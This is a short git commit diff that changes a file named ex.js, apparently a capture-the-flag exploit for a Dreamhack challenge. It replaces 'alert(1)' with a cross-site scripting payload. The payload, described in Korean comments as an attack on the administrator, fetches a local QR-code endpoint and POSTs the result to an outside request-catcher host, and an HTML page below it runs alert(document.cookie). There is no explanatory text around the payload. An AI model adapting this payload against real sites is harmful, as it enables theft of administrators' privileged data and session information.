4274d858f135e4618d0d90e09842f8ccbc74110b
김명규 <141506886+rlaaudrb1104@users.noreply.github.com>
2024-10-23 22:30:13 +0900

    Update ex.js

--- ex.js
+++ ex.js
@@ -1,1 +1,29 @@
-alert(1)
+<script>
+    // 관리자를 자동으로 공격자 서버로 리다이렉트
+    var admin_url = "http://127.0.0.1:10023/generate_qr_code";
+    fetch(admin_url).then(response => response.text()).then(data => {
+        // QR 코드 정보를 공격자 서버로 전송
+        fetch("https://qbxfywa.request.dreamhack.games", {
+            method: "POST",
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                qr_info: data
+            })
+        });
+    });
+</script>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <p>hello</p>
+    <script>alert(document.cookie)</script>
+</body>
+</html>
